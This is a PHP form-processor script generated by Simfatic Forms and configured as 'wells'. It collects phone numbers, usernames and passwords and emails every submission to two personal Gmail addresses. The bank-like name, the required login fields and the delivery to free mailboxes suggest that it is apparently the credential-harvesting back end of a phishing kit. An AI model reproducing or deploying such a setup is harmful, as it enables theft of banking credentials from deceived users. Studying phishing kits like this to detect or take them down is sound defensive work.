<?PHP
/*
Simfatic Forms Main Form processor script

This script does all the server side processing. 
(Displaying the form, processing form submissions,
displaying errors, making CAPTCHA image, and so on.) 

All pages (including the form page) are displayed using 
templates in the 'templ' sub folder. 

The overall structure is that of a list of modules. Depending on the 
arguments (POST/GET) passed to the script, the modules process in sequence. 

Please note that just appending  a header and footer to this script won't work.
To embed the form, use the 'Copy & Paste' code in the 'Take the Code' page. 
To extend the functionality, see 'Extension Modules' in the help.

*/

@ini_set("display_errors", 1);//the error handler is added later in FormProc
error_reporting(E_ALL);

require_once(dirname(__FILE__)."/includes/wells-lib.php");
$formproc_obj =  new SFM_FormProcessor('wells');
$formproc_obj->initTimeZone('default');
$formproc_obj->setFormID('485b13e6-a0d2-414b-b97a-8ab0135c2450');
$formproc_obj->setFormKey('38936bad-f73b-416e-ad7c-96f087ed8cf4');
$formproc_obj->setLocale('en-US','yyyy-MM-dd');
$formproc_obj->setEmailFormatHTML(true);
$formproc_obj->EnableLogging(false);
$formproc_obj->SetDebugMode(false);
$formproc_obj->setIsInstalled(true);
$formproc_obj->SetPrintPreviewPage(sfm_readfile(dirname(__FILE__)."/templ/wells_print_preview_file.txt"));
$formproc_obj->SetSingleBoxErrorDisplay(true);
$formproc_obj->setFormPage(0,sfm_readfile(dirname(__FILE__)."/templ/wells_form_page_0.txt"));
$formproc_obj->AddElementInfo('phone','text','');
$formproc_obj->AddElementInfo('username','text','');
$formproc_obj->AddElementInfo('password','text','');
$formproc_obj->SetHiddenInputTrapVarName('t2fd79472d1ebd48cb876');
$formproc_obj->SetFromAddress('forms@ablontech.com');
$page_renderer =  new FM_FormPageDisplayModule();
$formproc_obj->addModule($page_renderer);

$validator =  new FM_FormValidator();
$validator->addValidation("phone","required","Please fill in phone");
$validator->addValidation("username","required","Please fill in username");
$validator->addValidation("password","required","Please fill in password");
$formproc_obj->addModule($validator);

$data_email_sender =  new FM_FormDataSender(sfm_readfile(dirname(__FILE__)."/templ/wells_email_subj.txt"),sfm_readfile(dirname(__FILE__)."/templ/wells_email_body.txt"),'');
$data_email_sender->AddToAddr('gdey0007@gmail.com');
$data_email_sender->AddToAddr('smsqueenss@gmail.com');
$formproc_obj->addModule($data_email_sender);

$tupage =  new FM_ThankYouPage(sfm_readfile(dirname(__FILE__)."/templ/wells_thank_u.txt"));
$formproc_obj->addModule($tupage);

$page_renderer->SetFormValidator($validator);
$formproc_obj->ProcessForm();

?>